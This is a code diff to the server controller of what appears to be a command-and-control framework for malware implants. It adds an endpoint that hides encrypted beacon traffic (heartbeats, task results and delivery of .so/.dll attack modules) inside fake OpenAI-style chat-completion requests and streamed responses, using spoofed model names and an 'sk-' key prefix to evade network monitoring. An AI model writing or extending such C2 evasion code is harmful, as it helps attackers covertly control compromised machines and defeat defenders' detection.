@@ -249,6 +249,215 @@ public class AgentCommsController : ControllerBase
         }
     }
 
+    /// AI 通道端点（v1/chat/completions 伪装）：请求体为 chat.completions 风格，
+    /// 密文在 messages[0].content，会话标识在 user 字段（随机会话 token）。
+    /// 响应为 text/event-stream，密文分块放在 delta.content，最后 [DONE]。
+    [HttpPost("ai")]
+    public async Task<IActionResult> AiChannel([FromBody] JsonElement? body)
+    {
+        if (body is not { } el)
+            return BadRequest(new { error = "invalid body" });
+
+        // 1) 解析 chat 请求
+        if (!el.TryGetProperty("messages", out var messages) ||
+            messages.ValueKind != JsonValueKind.Array ||
+            messages.GetArrayLength() == 0)
+        {
+            return BadRequest(new { error = "invalid messages" });
+        }
+        var first = messages[0];
+        if (!first.TryGetProperty("content", out var contentProp) || contentProp.GetString() is not string cipherB64)
+            return BadRequest(new { error = "invalid content" });
+        var userId = el.TryGetProperty("user", out var userProp) ? userProp.GetString() : null;
+
+        // 2) 密钥选择：user 字段（会话 token）→ 会话密钥；否则预会话密钥（注册）
+        byte[]? key = null;
+        string? agentId = null;
+        if (!string.IsNullOrEmpty(userId) &&
+            _commsService.TryResolveSessionToken(userId, out var resolved) &&
+            !string.IsNullOrEmpty(resolved))
+        {
+            agentId = resolved;
+            _commsService.TryGetSessionKey(resolved, out key);
+        }
+
+        string plain;
+        try
+        {
+            if (key != null)
+            {
+                plain = CryptoHelper.DecryptPayload(cipherB64, key);
+            }
+            else if (!string.IsNullOrEmpty(_beaconSettings.Secret))
+            {
+                plain = CryptoHelper.DecryptPayload(cipherB64, CryptoHelper.DerivePreSessionKey(_beaconSettings.Secret));
+            }
+            else
+            {
+                return Unauthorized(new { error = "no key available" });
+            }
+        }
+        catch (Exception)
+        {
+            return Unauthorized(new { error = "decrypt failed" });
+        }
+
+        // 3) 信封解析
+        BeaconEnvelope? env;
+        try
+        {
+            env = JsonSerializer.Deserialize<BeaconEnvelope>(plain, new JsonSerializerOptions
+            {
+                PropertyNameCaseInsensitive = true
+            });
+        }
+        catch (JsonException)
+        {
+            return BadRequest(new { error = "bad envelope" });
+        }
+        if (env == null || string.IsNullOrEmpty(env.Op))
+            return BadRequest(new { error = "bad envelope" });
+
+        var bytesReceived = Request.ContentLength ?? 0;
+        var profile = await _commsService.GetActiveProfileAsync();
+
+        // 4) 分发 → 响应明文
+        string? responsePlain = null;
+        switch (env.Op)
+        {
+            case "reg":
+            {
+                // 注册走旧端点（明文/密文），AI 通道不承载注册
+                return BadRequest(new { error = "register via beacon endpoint" });
+            }
+            case "hb":
+            {
+                if (agentId == null || key == null)
+                    return Unauthorized(new { error = "session not established" });
+                // 重放保护
+                try
+                {
+                    using var hb = JsonDocument.Parse(env.Data);
+                    if (hb.RootElement.TryGetProperty("ts", out var ts) && ts.TryGetInt64(out var ms))
+                    {
+                        var now = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
+                        if (Math.Abs(now - ms) > 120_000)
+                            return Unauthorized(new { error = "stale heartbeat" });
+                    }
+                }
+                catch (JsonException)
+                {
+                    return BadRequest(new { error = "invalid payload" });
+                }
+                var (valid, task, hostname) = await _commsService.HandleHeartbeatAsync(agentId);
+                if (!valid)
+                    return NotFound(new { error = "agent not found" });
+                responsePlain = JsonSerializer.Serialize(new HeartbeatResponse { PendingTask = task });
+                _commsService.RecordTraffic(agentId, hostname, bytesReceived, 0);
+                break;
+            }
+            case "res":
+            {
+                if (agentId == null || key == null)
+                    return Unauthorized(new { error = "session not established" });
+                TaskResult? result;
+                try
+                {
+                    result = JsonSerializer.Deserialize<TaskResult>(env.Data);
+                }
+                catch (JsonException)
+                {
+                    return BadRequest(new { error = "invalid payload" });
+                }
+                if (result == null)
+                    return BadRequest(new { error = "invalid payload" });
+                var ok = await _commsService.HandleResultAsync(agentId, result, bytesReceived, 0);
+                if (!ok)
+                    return NotFound(new { error = "invalid task" });
+                responsePlain = JsonSerializer.Serialize(new { status = "received" });
+                break;
+            }
+            case "mod":
+            {
+                if (agentId == null || key == null)
+                    return Unauthorized(new { error = "session not established" });
+                string? name = null;
+                try
+                {
+                    using var doc = JsonDocument.Parse(env.Data);
+                    if (doc.RootElement.TryGetProperty("name", out var n))
+                        name = n.GetString();
+                }
+                catch (JsonException)
+                {
+                    return BadRequest(new { error = "invalid payload" });
+                }
+                if (string.IsNullOrEmpty(name) || name.Any(c => !(char.IsAsciiLetterOrDigit(c) || c == '-' || c == '_')))
+                    return BadRequest(new { error = "invalid module name" });
+
+                var platform = await ResolveAgentPlatformAsync(agentId);
+                if (platform == null)
+                    return NotFound(new { error = "agent platform unknown" });
+
+                var modulesDir = Path.Combine(BuildsDir, "modules", platform);
+                var ext = platform.StartsWith("linux") ? "so" : "dll";
+                var modulePath = Path.Combine(modulesDir, $"{name}.{ext}");
+                if (!System.IO.File.Exists(modulePath))
+                {
+                    var legacy = Path.Combine(BuildsDir, "modules", $"{name}.{ext}");
+                    if (System.IO.File.Exists(legacy))
+                        modulePath = legacy;
+                }
+                if (!System.IO.File.Exists(modulePath))
+                    return NotFound(new { error = "module not found" });
+
+                var bytes = System.IO.File.ReadAllBytes(modulePath);
+                // 密文内容为 base64 的模块二进制
+                responsePlain = Convert.ToBase64String(bytes);
+                break;
+            }
+            default:
+                return BadRequest(new { error = "unknown op" });
+        }
+
+        if (responsePlain == null)
+            return BadRequest(new { error = "no response" });
+
+        // 5) SSE 响应：密文分块（≤60KB base64）放入 delta.content
+        var encrypted = CryptoHelper.EncryptPayload(responsePlain, key!);
+        var chunks = ChunkString(encrypted, 60 * 1024);
+        var sb = new StringBuilder();
+        var completionId = "chatcmpl-" + Guid.NewGuid().ToString("N")[..24];
+        var model = profile is ConfigurableProfile cp2 && cp2.Config.AiModels.Count > 0
+            ? cp2.Config.AiModels[Random.Shared.Next(cp2.Config.AiModels.Count)]
+            : "gpt-4o-mini";
+        var created = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
+        foreach (var chunk in chunks)
+        {
+            sb.Append("data: ")
+              .Append(JsonSerializer.Serialize(new
+              {
+                  id = completionId,
+                  obj = "chat.completion.chunk",
+                  created,
+                  model,
+                  choices = new[]
+                  {
+                      new { index = 0, delta = new { content = chunk }, finish_reason = (string?)null }
+                  }
+              }))
+              .Append("\n\n");
+        }
+        sb.Append("data: [DONE]\n\n");
+        return Content(sb.ToString(), "text/event-stream");
+    }
+
+    private static IEnumerable<string> ChunkString(string s, int size)
+    {
+        for (var i = 0; i < s.Length; i += size)
+            yield return s.Substring(i, Math.Min(size, s.Length - i));
+    }
+
     private async Task<IActionResult> HandleRegAsync(string regData, IMalleableProfile profile)
     {
         RegisterRequest? request;
@@ -426,7 +635,10 @@ public class AgentCommsController : ControllerBase
                 paddingMin = c.PaddingMin,
                 paddingMax = c.PaddingMax,
                 heartbeatIntervalMs = c.HeartbeatIntervalSeconds * 1000,
-                jitterPercent = c.JitterPercent
+                jitterPercent = c.JitterPercent,
+                aiPath = c.AiPath,
+                aiModels = c.AiModels,
+                authPrefix = c.AuthPrefix
             };
         }
         // DefaultProfile 固定值
@@ -443,7 +655,10 @@ public class AgentCommsController : ControllerBase
             paddingMin = 0,
             paddingMax = 64,
             heartbeatIntervalMs = 30000,
-            jitterPercent = 0.2
+            jitterPercent = 0.2,
+            aiPath = "/v1/chat/completions",
+            aiModels = new[] { "gpt-4o-mini", "gpt-4o", "gpt-4.1-mini" },
+            authPrefix = "sk-"
         };
     }
 
